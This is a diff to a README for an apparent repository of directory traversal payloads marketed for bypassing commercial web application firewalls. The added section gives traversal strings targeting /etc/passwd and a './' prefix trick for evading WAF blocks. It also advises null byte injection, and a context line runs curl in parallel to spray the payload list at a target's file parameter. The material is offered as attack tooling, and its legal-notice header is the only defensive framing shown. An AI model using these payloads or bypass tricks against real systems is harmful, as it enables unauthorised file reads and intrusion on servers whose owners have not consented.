@@ -2,6 +2,7 @@
 
 **The ultimate collection for bypassing WAFs in 2025** - CloudFlare, Imperva, F5, ModSecurity, AWS WAF, Azure WAF, and more.
 
+
 ## Overview
 
 This repository contains **800+ battle-tested directory traversal payloads** designed to bypass modern Web Application Firewalls. These payloads are built from:
@@ -54,7 +55,7 @@ cat payloads.txt | parallel -j 50 'curl -s "https://target.com/api?file={}" | gr
 
 ---
 
-## 💡 2025 WAF Bypass Techniques
+##💡 2025 WAF Bypass Techniques
 
 ### CloudFlare Bypass
 ```bash
@@ -546,6 +547,21 @@ done
 ```
 
 ---
+
+## Tips & Tricks And Advice
+```bash
+
+1 - In path traversal, if the server responds with 400 while you are traversing, it means you have reached the root directory and more. You must delete ../ Example :
+../../../../../etc/passwd  , server return --> 400 Bad Request --> You are in root directory ❌
+../../../../etc/passwd  , server return --> 400 Bad Request --> You are in root directory ❌
+../../../etc/passwd  , server return --> 200 OK --> You are in the root directory ✅
+
+2 - You can trick WAF into thinking you're using ./ Example :
+../etc/passwd --> return 403 forbidden ❌
+./../etc/passwd --> return 200 OK ✅
+
+3 - The use of null byte injection %00 is with things that depend on or are built on C/C++ languages, such as libraries in PHP or functions, and also in other languages.
+```
 
 ## ⚠️ Legal & Ethical Notice
 
